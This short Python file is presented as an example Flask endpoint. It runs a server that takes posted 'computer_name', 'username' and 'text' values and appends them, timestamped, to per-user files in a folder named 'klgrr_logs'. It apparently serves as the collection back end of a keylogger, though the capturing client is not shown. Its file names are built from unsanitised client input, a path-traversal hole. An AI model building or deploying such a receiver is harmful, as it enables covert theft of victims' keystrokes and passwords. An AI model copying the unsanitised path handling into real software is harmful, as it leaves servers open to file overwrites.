# Example of an endpoint handler on Flask

from flask import Flask, request
import datetime, os


path_for_logs = os.path.join(os.path.dirname(__file__), "klgrr_logs")
if not os.path.exists(path_for_logs):
    os.makedirs(path_for_logs, exist_ok=True)


app = Flask(__name__)

@app.route('/', methods=['POST'])
def receive_data():
    data = request.get_json()
    computer_name = data.get('computer_name', 'Unknown')
    username = data.get('username', 'User')
    text = data.get('text', '')
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(os.path.join(path_for_logs, f"{username}.{computer_name}.log"),
              "a", encoding="utf-8") as f:
        f.write(f"[{current_time}] {username}.{computer_name}: {text}\n")
    return "200"

app.run(threaded=True)